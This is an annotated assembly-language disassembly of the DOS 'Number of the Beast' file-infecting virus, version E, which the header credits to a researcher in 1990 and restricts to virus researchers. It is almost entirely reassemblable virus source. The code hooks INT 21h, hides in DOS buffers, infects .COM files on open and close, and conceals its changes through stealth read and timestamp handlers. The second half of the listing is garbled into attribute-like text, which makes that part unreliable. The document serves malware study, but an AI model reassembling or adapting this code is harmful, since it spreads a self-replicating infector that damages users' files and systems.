

	name	V512E
	title	V512E - The 'Number of the Beast' Virus
	subttl	(Version E - a mutation)
	.radix	16

; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        º
; º  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 º
; º									     º
; º		     The 'Number of the Beast' Virus, version E              º
; º		   Disassembled by Vesselin Bontchev, April 1990	     º
; º									     º
; º		     Copyright (c) Vesselin Bontchev 1989, 1990 	     º
; º									     º
; º	 This listing is only to be made available to virus researchers      º
; º		   or software writers on a need-to-know basis. 	     º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code,ds:code,es:code

	org	50

psp_ret equ	$

	org	100

start:
	mov	si,4		; Point DS at interrupt vectors

; Modify the DOS dispatcher at PSP:50h (it contains CD 21 CB - INT 21h; RETF).
; Now it will contain CD 21 95 CB (INT 21h; XCHG AX,BP; RETF) and AX will
; be restored on exit.

	mov	word ptr [si+(50+2-4)],0CB95

	xchg	ax,bp		; Save AX in BP

	mov	ds,si
	lds	dx,[si+8]	; Get INT 13h vector in DS:DX

; The PC-DOS version check is omitted. This is rather strange,
; since the trick below works only for PC-DOS version 3.30.

	mov	ah,13		; Get original INT 13h vector in DS:DX
	int	2F
	push	ds		; Save it
	push	dx
	int	2F		; Call INT 2F again to restore DS & DX
	pop	ax
	mov	di,0F8		; Save the original INT 13h vector at PSP:0F8
	stosw
	pop	ax
	stosw			; Now DI == 0FCh (which is also new_int_21)

	mov	ds,si		; Now get INT 21h vector in DS:AX
	lds	ax,[si+40]

	cmp	ax,di		; Is virus in memory?

	stosw			; Store vector at PSP:0FC
	mov	ax,ds
	stosw			; By the way, now DI == 100h

	push	es		; Now RETF will jump to PSP:100h,
	push	di		;  i.e. to start
	jne	install 	; Virus not present. Go to installation

	shl	si,1		; Second check for virus in memory. SI := 8
	mov	cx,(begword-start)/2	; Compare the virus code with DS:8
	rep	cmpsw
	je	run		; Virus found. Run the original program

; Virus not found in memory. Install it there. The memory check is not
; quite correct. Since the virus does not try to be the fist program
; which intercepts INT 21h, it is possible that it is already present
; in memory, but another program (a TSR one) has changed the INT 21h
; vector. This will cause the reloading of the virus and another buffer
; will "disapear". If there is no more buffers, the machine may hang.

install:
	mov	ah,52		; Get list of lists in ES:BX
	int	21

	push	es		; Save list's segment
	mov	si,0F8		; Prepare for move. Offset of source address.
	les	di,es:[bx+12]	; Point ES:AX at first DOS buffer

; Point DX at next DOS buffer. And what if there are no more buffers?

	mov	dx,es:[di+2]

; Copy the saved original interrupt vectors plus
; the virus body in the 1st DOS buffer:

	mov	cx,(begword-start+8)/2
	rep	movs word ptr es:[di],ss:[si]

	mov	ds,cx		; Install ES:121 (new_int_21)
	mov	di,16		;  as new INT 21h handler
	mov	word ptr [di+21*4-16],(new_int_21 - start) + 8
	mov	[di+21*4-16+2],es

	pop	ds		; Point DS at the list of lists' segment

; "Hide" the virus (now in the first DOS buffer) by excluding this
; buffer from the DOS buffer chain. To do so, just set the
; first buffer pointer to point at the next buffer of the chain.
; (DX already points at the next DOS I/O buffer.)

	mov	[bx+14],dx

	mov	dx,ss		; DX := current PSP
	mov	ds,dx		; Restore DS == CS

	mov	bx,[di+2-16]	; Point BX at high memory
	dec	bh

	mov	es,bx		; Point ES at the last 4 Kbytes of memory

; If the current PSP is less than the previous one, then
; IBMDOS.COM is just loading the command interpretter
; and the current PSP belongs to the latter.

	cmp	dx,[di]

; Get command interpretter's full name in DS:16h

	mov	ds,[di]
	mov	dx,[di]
	dec	dx
	mov	ds,dx

	mov	si,cx		; SI := 0
	mov	dx,di		; DX := 16h (DI == 16h)

; Copy this name (up to 80 characters) to higher memory,
; eventualy destroys COMMAND.COM's transient part.

	mov	cl,80d/2
	rep	movsw

	mov	ds,bx
	jb	boot		; Run command interpretter at boot time

run:
	mov	si,cx		; SI := 0
	mov	ds,ss:[si+2C]	; Get environment address
srch_lp:
	lodsw			; Search the end of the environment
	dec	si
	and	ax,ax
	jnz	srch_lp

	lea	dx,[si+3]	; Get program's name (argv [0]) in DX
boot:
	mov	ax,3D00 	; Open file
	int	21

	xchg	ax,bx		; Save file handle in BX

	pop	si		; Restore SI
	push	si

	push	ss		; DS := SS; ES := SS (== CS)
	pop	ds
	push	ss
	pop	es

	mov	dx,si		; DX := SI

	mov	cl,2		; Read the original first 2 bytes
	mov	ah,3F		;  of the file into DS:[start]
	int	21		; Do it. After it AX == 0002 (i.e. AH == 0)

	mov	dl,cl		; DX := 102h
	xchg	cl,ch		; CX := 200h (512d)

	mov	di,offset ds:[begword]
	cmpsw

	jne	skip1		; Exit if not
	mov	ah,3F		; Otherwise read the next 512 bytes of the file

; Now jump to PSP:50h. There are the instructions INT 21h; RETF there. Thus,
; this will execute the DOS function call in AX, then jump to PSP:100h.
; If the original first word of the file did match the saved word then
; everything is OK, the original first 512 bytes of the file are read and
; executed. The countrary means that the file is destroyed and the
; DOS function 0 (program terminate) is executed instead.

skip1:
	jmp	psp_ret

read:				; READ function handler
	call	point		; Point ES:DI at file's internal FCB
	mov	si,es:[di]	; Remember file position in SI

	mov	ah,3F
	int	21		; Read from file handle

	cmp	si,bp		; Is file position < 512?="" jnb="" int_21_xit1="" ;="" exit="" if="" not="" push="" ax="" ;="" save="" ax="" mov="" al,es:[di-8]="" ;="" get="" file="" time="" not="" al="" and="" al,1f="" ;="" seconds="=" 62?="" jnz="" int_21_xit="" ;="" exit="" if="" not="" add="" si,es:[di-4]="" ;="" compute="" offset="" at="" original="" code="" xchg="" si,es:[di]="" ;="" swap="" position="" (correct)="" add="" es:[di-4],bp="" ;="" correct="" file="" size="" (+512)="" mov="" ah,3f="" ;="" read="" from="" file="" handle="" int="" 21="" sub="" es:[di-4],bp="" ;="" restore="" original="" file="" size="" (-512)="" xchg="" ax,si="" ;="" restore="" original="" position="" stosw="" int_21_xit:="" pop="" ax="" ;="" restore="" ax="" int_21_xit1:="" pop="" es="" ;="" restore="" saved="" registers="" pop="" si="" pop="" di="" pop="" bp="" retf="" 2="" ;="" return="" error="" code="" in="" flags="" get_time:="" ;="" get="" file="" date="" &="" time="" function="" handler="" int="" 21="" ;="" execute="" the="" requested="" function="" lahf="" ;="" save="" flags="" mov="" al,cl="" ;="" get="" file="" time="" and="" al,1f="" ;="" (the="" seconds="" more="" exactly)="" cmp="" al,1f="" ;="" do="" they="" indicate="" an="" infected="" file?="" jne="" skip2="" ;="" skip="" the="" following="" code="" if="" so="" xor="" cl,al="" ;="" otherwise="" zero="" them="" to="" fool="" everybody="" skip2:="" sahf="" ;="" restore="" flags="" jmp="" int_21_xit="" ;="" and="" exit="" new_int_21:="" ;="" new="" int="" 21h="" handler="" push="" bp="" ;="" save="" used="" registers="" push="" di="" push="" si="" push="" es="" ;="" see="" if="" this="" handler="" is="" executed="" via="" an="" int="" 21h="" from="" ;="" the="" virus="" body.="" a="" rather="" clumsy="" check,="" imho.="" cld="" ;="" clear="" direction="" flag="" mov="" bp,sp="" mov="" es,[bp+0a]="" ;="" get="" the="" caller's="" cs="" mov="" di,(new_int_21-start+17)="" mov="" si,di="" ;="" see="" if="" the="" word="" at="" cs:[new_int_21]="" cmps="" word="" ptr="" cs:[si],es:[di]="" ;="" equals="" the="" resp.="" word="" in="" the="" caller="" je="" exit="" ;="" exit="" if="" so="" cmp="" ah,3f="" ;="" is="" it="" a="" read="" function="" call?="" je="" read="" ;="" do="" it="" if="" so="" push="" ax="" ;="" save="" ax="" cmp="" ax,5700="" ;="" is="" it="" a="" get="" file="" date="" &="" time="" function="" call?="" je="" get_time="" ;="" do="" it="" if="" so="" cmp="" ah,3e="" ;="" is="" it="" a="" close="" function="" call?="" pushf="" ;="" save="" flags="" &="" registers="" used="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" je="" close="" ;="" execute="" close="" function="" if="" so="" was="" requiested="" cmp="" ax,4b00="" ;="" is="" it="" an="" exec="" function="" call?="" je="" exec="" ;="" do="" it="" if="" so="" dos_xit:="" pop="" ds="" ;="" restore="" registers="" &="" flags="" pop="" dx="" pop="" cx="" pop="" bx="" popf="" je="" int_21_xit="" pop="" ax="" ;="" restore="" ax="" exit:="" pop="" es="" ;="" restore="" saved="" registers="" pop="" si="" pop="" di="" pop="" bp="" ;="" exit="" trough="" the="" original="" int="" 21h="" handler:="" jmp="" dword="" ptr="" cs:[4]="" exec:="" mov="" ah,3dh="" ;="" open="" file="" with="" read="" access="" (al="=" 0)="" int="" 21h="" xchg="" ax,bx="" ;="" save="" file="" handle="" in="" bx="" close:="" ;="" close="" function="" handler="" call="" point="" ;="" point="" es:di="" at="" file="" position="" jc="" dos_xit="" ;="" this="" instruction="" is="" unnecessary="" xor="" cx,cx="" ;="" cx="" :="0" xchg="" cx,bp="" ;="" bp="" :="0;" cx="" :="512" mov="" ds,bp="" ;="" ds="" :="0" mov="" si,13*4="" ;="" point="" si="" at="" int="" 13h="" vector="" ;="" get="" new="" int="" 24h="" handler's="" address="" in="" dx:ax:="" mov="" ax,(new_int_24="" -="" start)="" +="" 8="" mov="" dx,cs="" xchg="" ax,[si+(24*4-13*4)]="" ;="" swap="" it="" with="" the="" old="" handler="" xchg="" dx,[si+(24*4-13*4+2)]="" push="" dx="" ;="" save="" the="" old="" int="" 24h="" vector="" on="" the="" stack="" push="" ax="" lodsw="" ;="" save="" the="" old="" int="" 13h="" handler="" on="" the="" stack="" too="" push="" ax="" lodsw="" push="" ax="" lds="" dx,cs:[si-(13*4+4)]="" ;="" set="" int="" 13h="" to="" saved="" vector="" mov="" ax,2513="" ;="" prepare="" to="" set="" vector="" push="" ax="" ;="" save="" operation="" code="" on="" stack="" int="" 21="" ;="" do="" set="" vector="" push="" es="" pop="" ds="" ;="" ds="" :="ES" mov="" [di],bp="" ;="" seek="" to="" file="" beginning="" (bp="=" 0)="" mov="" [di-13],ch="" ;="" set="" access="" rights="" to="" writable="" (ch="=" 02h)="" cmp="" word="" ptr="" [di+13],'oc'="" ;="" '*.co?'="" file?="" jne="" go_close="" ;="" exit="" if="" not="" mov="" dx,[di-4]="" ;="" get="" file="" size="" add="" dh,ch="" ;="" add="" 512="" to="" it="" (cx="=" 0200h)="" cmp="" dh,4="" ;="" is="" file="" size="">< 512?="" jb="" go_close="" ;="" don't="" infect="" if="" so="" ;="" the="" file_size="" +="" virus_length="">< 64k="" check="" has="" gone.="" why?!="" test="" ch,[di-11]="" ;="" test="" hidden="" attribute="" (ch="=" 10b)="" jnz="" go_close="" ;="" exit="" if="" on="" lds="" si,[di-0e]="" ;="" get="" device="" driver="" pointer="" cmp="" [si+4],ch="" ;="" see="" if="" at="" least="" 3="" sectors/cluster="" (ch="=" 02h)="" jbe="" skip3="" dec="" dx="" shr="" dh,1="" ;="" dh="" :="number" of="" last="" sector="" after="" infection="" and="" dh,[si+4]="" ;="" get="" sector's="" number="" in="" the="" cluster="" jz="" go_close="" ;="" exit="" if="" does="" not="" fit="" skip3:="" mov="" ds,bp="" ;="" read="" 512="" bytes="" using="" file="" handle="" mov="" dx,cx="" ;="" into="" 0000:0200h="" mov="" ah,3f="" int="" 21="" ;="" do="" it="" mov="" si,dx="" ;="" si="" :="512" (dx="=" 512)="" dec="" cx="" ;="" cx="" :="510" dec="" cx="" v_srch:="" lodsb="" cmp="" al,cs:[si-(512d-8+1)]="" ;="" see="" if="" virus="" present="" in="" file="" jne="" infect="" ;="" infect="" file="" if="" not="" loop="" v_srch="" go_close:="" mov="" ah,3e="" ;="" close="" file="" int="" 21="" ;="" do="" it="" pop="" ax="" ;="" restore="" 2513h="" in="" ax="" from="" stack="" pop="" ds="" ;="" restore="" old="" int="" 13h="" handler="" from="" stack="" pop="" dx="" int="" 21="" ;="" set="" old="" int="" 13h="" interrupt="" vector="" pop="" dx="" ;="" rstore="" old="" int="" 24h="" handler="" from="" stack="" pop="" ds="" mov="" al,24="" ;="" set="" old="" int="" 14h="" interrupt="" vector="" int="" 21="" ;="" do="" it="" jmp="" dos_xit="" ;="" exit="" infect:="" mov="" cx,dx="" ;="" cx="" :="512" mov="" si,es:[di-4]="" ;="" get="" file="" size="" mov="" es:[di],si="" ;="" seek="" at="" end="" of="" file="" mov="" ah,40="" ;="" write="" to="" file="" (the="" original="" bytes)="" int="" 21="" mov="" es:[di-4],si="" ;="" restore="" file="" size="" ;="" seek="" to="" file="" begining="" (es:di="" points="" at="" file="" position="" and="" bp="" contains="" 0):="" xchg="" ax,bp="" stosw="" jc="" error="" ;="" exit="" if="" error="" in="" reading="" mov="" ax,ds:[200]="" ;="" get="" the="" first="" byte="" of="" the="" code="" read="" push="" cs="" ;="" ds="" :="CS" pop="" ds="" mov="" word="" ptr="" ds:[begword-start+8],ax="" mov="" dx,8="" ;="" write="" virus="" code="" (at="" ds:8)="" onto="" mov="" ah,40="" ;="" the="" file="" beginning="" int="" 21="" ;="" do="" it="" or="" byte="" ptr="" es:[di-0a],1f="" ;="" set="" file="" time="" seconds="" to="" 62="" error:="" or="" byte="" ptr="" es:[di-11],40="" ;="" set="" 'file="" modified'="" bit="" jmp="" go_close="" ;="" and="" exit="" point:="" push="" bx="" ;="" save="" bx="" mov="" ax,1220="" ;="" get="" system="" file="" table="" entry="" no.="" for="" int="" 2f="" ;="" file="" the="" handle="" in="" bx="" into="" es:di="" mov="" bl,es:[di]="" mov="" ax,1216="" ;="" get="" system="" fcb="" for="" file="" table="" entry="" int="" 2f="" ;="" no.="" in="" bx="" into="" es:di="" pop="" bx="" ;="" restore="" bx="" mov="" bp,512d="" ;="" bp="" :="512" lea="" di,[di+15]="" ;="" point="" di="" at="" file="" position="" ret="" ;="" done.="" return="" new_int_24:="" ;="" new="" critical="" error="" handler="" mov="" al,3="" ;="" just="" ignore="" iret="" ;="" and="" exit="" begword="" dw="" 2de9="" code="" ends="" end="" start="" ="">